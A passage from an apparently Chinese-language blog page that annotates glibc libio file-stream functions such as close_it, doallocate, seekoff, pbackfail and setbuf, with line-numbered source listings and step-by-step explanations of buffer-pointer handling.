(fp))</span><br><span class="line">_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure><ol><li>如果文件不处于打开状态,直接返回</li><li>如果文件不禁止写且正处于写入模式,调用_IO_do_flush,否则设置write_status = 0</li><li>调用_IO_unsave_markers (fp);</li><li>如果文件未设置_IO_FLAGS2_NOCLOSE,调用sysclose关闭文件描述符</li><li>如果文件为宽字符模式,对宽字符缓冲进行处理</li><li>设置缓冲区指针为null</li><li>调用_IO_un_link解链文件</li><li>设置标志位,设置偏移基址为末尾设置文件描述符</li><li>返回close_status ? close_status : write_status;</li></ol><h2 id="doallocate"><a href="#doallocate" class="headerlink" title="doallocate"></a>doallocate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure><ol><li>如果文件描述符大于等于0且文件返回的信息正常<ul><li>如果文件_IO_IS_FILEBUF标志被设置,设置 _IO_LINE_BUF标志位</li></ul></li><li>malloc申请chunk</li><li>设置buf指针并返回</li></ol><h2 id="seekpos"><a href="#seekpos" class="headerlink" title="seekpos"></a>seekpos</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_default_seekpos (FILE *fp, <span class="type">off64_t</span> pos, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_SEEKOFF (fp, pos, <span class="number">0</span>, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用_IO_SEEKOFF</p><h2 id="seekoff"><a href="#seekoff" class="headerlink" title="seekoff"></a>seekoff</h2><p>出现频率不高,暂时先略过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_new_file_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = (fp-&gt;_IO_read_base == fp-&gt;_IO_read_end</span><br><span class="line">       &amp;&amp; fp-&gt;_IO_write_base == fp-&gt;_IO_write_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_get_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* It could be that we already have a pushback buffer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_read_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (dir)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> _IO_seek_cur:</span><br><span class="line">      <span class="comment">/* Adjust for read-ahead (bytes is buffer). */</span></span><br><span class="line">      offset -= fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_offset == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">goto</span> dumb;</span><br><span class="line">      <span class="comment">/* Make offset absolute, assuming current pointer is file_ptr(). */</span></span><br><span class="line">      offset += fp-&gt;_offset;</span><br><span class="line">      <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (EINVAL);</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      dir = _IO_seek_set;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IO_seek_set:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IO_seek_end:</span><br><span class="line">      &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">if</span> (_IO_SYSSTAT (fp, &amp;st) == <span class="number">0</span> &amp;&amp; S_ISREG (st.st_mode))</span><br><span class="line">  &#123;</span><br><span class="line">    offset += st.st_size;</span><br><span class="line">    dir = _IO_seek_set;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">goto</span> dumb;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_free_backup_area (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* At this point, dir==_IO_seek_set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If destination is within current buffer, optimize: */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD &amp;&amp; fp-&gt;_IO_read_base != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; !_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> start_offset = (fp-&gt;_offset</span><br><span class="line">                              - (fp-&gt;_IO_read_end - fp-&gt;_IO_buf_base));</span><br><span class="line">      <span class="keyword">if</span> (offset &gt;= start_offset &amp;&amp; offset &lt; fp-&gt;_offset)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">    fp-&gt;_IO_buf_base + (offset - start_offset),</span><br><span class="line">    fp-&gt;_IO_read_end);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  _IO_mask_flags (fp, <span class="number">0</span>, _IO_EOF_SEEN);</span><br><span class="line">  <span class="keyword">goto</span> resync;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    <span class="keyword">goto</span> dumb;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to seek to a block boundary, to improve kernel page management. */</span></span><br><span class="line">  new_offset = offset &amp; ~(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base - <span class="number">1</span>);</span><br><span class="line">  delta = offset - new_offset;</span><br><span class="line">  <span class="keyword">if</span> (delta &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      new_offset = offset;</span><br><span class="line">      delta = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  result = _IO_SYSSEEK (fp, new_offset, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (delta == <span class="number">0</span>)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">   (must_be_exact</span><br><span class="line">    ? delta : fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; delta)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We weren&#x27;t allowed to read, but try to seek the remainder. */</span></span><br><span class="line">  offset = count == EOF ? delta : delta-count;</span><br><span class="line">  dir = _IO_seek_cur;</span><br><span class="line">  <span class="keyword">goto</span> dumb;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base + delta,</span><br><span class="line">    fp-&gt;_IO_buf_base + count);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_offset = result + count;</span><br><span class="line">  _IO_mask_flags (fp, <span class="number">0</span>, _IO_EOF_SEEN);</span><br><span class="line">  <span class="keyword">return</span> offset;</span><br><span class="line"> dumb:</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line">  result = _IO_SYSSEEK (fp, offset, dir);</span><br><span class="line">  <span class="keyword">if</span> (result != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_mask_flags (fp, <span class="number">0</span>, _IO_EOF_SEEN);</span><br><span class="line">      fp-&gt;_offset = result;</span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">resync:</span><br><span class="line">  <span class="comment">/* We need to do it since it is possible that the file offset in</span></span><br><span class="line"><span class="comment">     the kernel may be changed behind our back. It may happen when</span></span><br><span class="line"><span class="comment">     we fopen a file and then do a fork. One process may access the</span></span><br><span class="line"><span class="comment">     file and the kernel file offset will be changed. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    _IO_SYSSEEK (fp, fp-&gt;_offset, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> offset;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_seekoff, _IO_file_seekoff)</span><br></pre></td></tr></table></figure><h2 id="pbackfail"><a href="#pbackfail" class="headerlink" title="pbackfail"></a>pbackfail</h2><p>出现频率不高,暂时先略过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_pbackfail (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; !_IO_in_backup (fp)</span><br><span class="line">      &amp;&amp; (<span class="type">unsigned</span> <span class="type">char</span>) fp-&gt;_IO_read_ptr[<span class="number">-1</span>] == c)</span><br><span class="line">    --fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span></span><br><span class="line">      <span class="keyword">if</span> (!_IO_in_backup (fp))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We need to keep the invariant that the main get area</span></span><br><span class="line"><span class="comment">     logically follows the backup area.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; _IO_have_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_ptr))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!_IO_have_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No backup buffer: allocate one. */</span></span><br><span class="line">      <span class="comment">/* Use nshort buffer, if unused? (probably not)  FIXME */</span></span><br><span class="line">      <span class="type">int</span> backup_size = <span class="number">128</span>;</span><br><span class="line">      <span class="type">char</span> *bbuf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (backup_size);</span><br><span class="line">      <span class="keyword">if</span> (bbuf == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      fp-&gt;_IO_save_base = bbuf;</span><br><span class="line">      fp-&gt;_IO_save_end = fp-&gt;_IO_save_base + backup_size;</span><br><span class="line">      fp-&gt;_IO_backup_base = fp-&gt;_IO_save_end;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_switch_to_backup_area (fp);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt;= fp-&gt;_IO_read_base)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Increase size of existing backup buffer. */</span></span><br><span class="line">  <span class="type">size_t</span> new_size;</span><br><span class="line">  <span class="type">size_t</span> old_size = fp-&gt;_IO_read_end - fp-&gt;_IO_read_base;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  new_size = <span class="number">2</span> * old_size;</span><br><span class="line">  new_buf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="built_in">memcpy</span> (new_buf + (new_size - old_size), fp-&gt;_IO_read_base,</span><br><span class="line">  old_size);</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_read_base);</span><br><span class="line">  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),</span><br><span class="line">    new_buf + new_size);</span><br><span class="line">  fp-&gt;_IO_backup_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *--fp-&gt;_IO_read_ptr = c;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_pbackfail)</span><br></pre></td></tr></table></figure><h2 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><ol><li>调用_IO_default_setbuf (fp, p, len)</li><li>调整pptr和gptr为_IO_buf_base</li></ol><p>看_IO_default_setbuf (fp, p, len)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>sync平衡失败直接返回NULL</li><li>缓冲区未指定或长度为0,将文件流设置为无缓冲模式,并设置缓冲区指针为shorbuf</li><li>否则取消无缓冲标志并设置缓冲区为指定区域</li><li>更新pptr和gptr为null</li><li>返回fp</li></ol><h2 id="xsgetn"><a href="#xsgetn" class="headerlink" title="xsgetn"></a>xsgetn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 